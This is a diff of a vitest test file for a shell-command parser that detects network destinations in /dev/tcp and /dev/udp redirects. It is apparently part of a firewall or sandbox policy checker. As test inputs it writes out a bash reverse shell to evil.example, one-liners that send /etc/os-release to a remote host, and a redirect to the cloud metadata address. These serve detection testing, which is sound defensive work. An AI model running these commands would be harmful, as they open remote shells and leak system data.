@@ -7,7 +7,7 @@
 // must NOT fire — it isn't a real network call.
 
 import { describe, it, expect } from 'vitest';
-import { extractShellDestinations, parseDestHost } from '../shell';
+import { extractShellDestinations, extractShellDestTokens, parseDestHost } from '../shell';
 
 const hosts = (cmd: string) =>
   extractShellDestinations(cmd)
@@ -198,5 +198,40 @@ describe('extractShellDestinations through wrappers', () => {
         cmd
       ).toContain('x.example');
     }
+  });
+});
+
+// A redirect to bash's /dev/tcp or /dev/udp pseudo-files opens a socket: a
+// network destination without curl or nc (fw#372 A1).
+describe('extractShellDestinations — /dev/tcp and /dev/udp redirects', () => {
+  it('a reverse shell names its host', () => {
+    expect(hosts('bash -i >& /dev/tcp/evil.example/4444 0>&1')).toEqual(['evil.example']);
+  });
+  it('exec with a read-write redirect, and a write to /dev/udp', () => {
+    expect(hosts('exec 3<>/dev/tcp/evil.example/80')).toEqual(['evil.example']);
+    expect(hosts('cat /etc/os-release > /dev/udp/10.0.0.5/514')).toEqual(['10.0.0.5']);
+  });
+  it('a host held in a variable resolves', () => {
+    expect(hosts('h=evil.example; cat /etc/os-release > /dev/tcp/$h/9')).toEqual(['evil.example']);
+  });
+  it('a bare host name without a dot is still a destination (the path shape is unambiguous)', () => {
+    expect(hosts('bash -i >& /dev/tcp/h/4444 0>&1')).toEqual(['h']);
+  });
+  it('the destination carries the pseudo-file as its binary', () => {
+    expect(extractShellDestinations('exec 3<>/dev/tcp/evil.example/80')).toEqual([
+      { host: 'evil.example', binary: '/dev/tcp', raw: '/dev/tcp/evil.example/80' },
+    ]);
+  });
+  it('the SSRF floor sees the same token', () => {
+    expect(extractShellDestTokens('bash -i >& /dev/tcp/169.254.169.254/80 0>&1')).toEqual([
+      { token: '169.254.169.254', binary: '/dev/tcp' },
+    ]);
+  });
+  it('must NOT fire: ordinary device files, a text mention, a look-alike path', () => {
+    expect(hosts('cat f > /dev/null 2>&1')).toEqual([]);
+    expect(hosts('echo "bash -i >& /dev/tcp/evil.example/4444"')).toEqual([]);
+    expect(hosts('cat f > /dev/tcp.log')).toEqual([]);
+    expect(hosts('cat f > ./dev/tcp/evil.example/80')).toEqual([]);
+    expect(hosts('cat f > /dev/tcp/evil.example')).toEqual([]);
   });
 });
